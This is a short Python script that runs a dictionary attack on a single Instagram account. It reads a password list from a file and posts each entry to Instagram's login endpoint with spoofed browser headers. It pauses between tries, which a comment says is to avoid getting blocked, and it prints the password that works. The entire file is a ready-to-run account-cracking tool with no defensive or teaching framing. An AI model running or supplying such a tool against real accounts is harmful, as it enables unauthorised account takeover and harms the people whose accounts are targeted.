import requests
import time

def instagram_login(username, password):
    url = 'https://www.instagram.com/accounts/login/ajax/'
    payload = {
        'username': username,
        'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{password}',
        'queryParams': {},
        'optIntoOneTap': 'false'
    }
    headers = {
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
        'x-csrftoken': 'missing',
        'x-ig-app-id': '936619743392459',
        'x-asbd-id': '198384',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        'accept': '*/*'
    }

    session = requests.Session()
    response = session.post(url, data=payload, headers=headers)

    if 'logged_in_user' in response.json():
        print(f"Successfully logged in with username: {username} and password: {password}")
        return True
    else:
        print(f"Failed to login with username: {username} and password: {password}")
        return False

def main():
    username = input("Enter the Instagram username: ")
    password_list = input("Enter the password list file path: ")

    with open(password_list, 'r') as file:
        passwords = file.readlines()

    for password in passwords:
        password = password.strip()
        if instagram_login(username, password):
            break
        time.sleep(1)  # To avoid getting blocked

if __name__ == "__main__":
    main()
